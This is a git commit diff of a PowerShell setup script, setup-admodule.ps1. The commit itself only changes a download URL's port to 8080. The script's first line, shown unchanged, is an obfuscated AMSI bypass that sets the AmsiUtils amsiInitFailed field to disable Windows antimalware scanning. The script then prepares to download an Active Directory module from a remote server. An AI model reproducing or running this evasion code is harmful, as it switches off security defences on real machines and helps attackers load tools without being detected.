0bd7bc55aa8ad67f07ac7da8dcb70c8ce9e962fe
qmt8843 <qmt8843@rit.edu>
2024-11-01 01:49:19 -0400

    Set port

--- setup-admodule.ps1
+++ setup-admodule.ps1
@@ -1,6 +1,6 @@
 [ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
 
-$dirUrl = "http://your.url.here:port/ADModule/"
+$dirUrl = "http://your.url.here:8080/ADModule/"
 $destFolder = "where\you\want\to\save\files\to\ADModule"
 
 if (!(Test-Path -Path $destFolder)) {
